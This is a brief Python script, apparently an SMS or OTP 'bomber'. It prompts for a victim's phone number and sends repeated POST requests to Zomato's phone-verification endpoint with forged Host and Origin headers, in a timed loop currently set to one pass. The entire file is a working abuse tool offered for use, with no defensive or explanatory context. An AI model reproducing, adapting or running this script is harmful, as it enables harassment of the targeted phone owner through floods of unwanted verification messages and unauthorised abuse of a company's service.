import requests
import time
def call(url,para,header):
    a=requests.post(url,data=para,headers=header)
no=input("Enter the 10 digit number")
url="https://www.zomato.com/php/o2_handler.php"
header = {'Host': 'www.zomato.com',"Origin": "http://hydra98.000webhostapp.com",
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
'Content-Type': 'application/x-www-form-urlencoded',
'Content-Length': '85'}
para={'case':'verifyphone','phone':no,'verification_type':'email','country_id':'1','res_id':'1234567'}
for i in range(0,1):
    call(url,para,header)
    time.sleep(10)
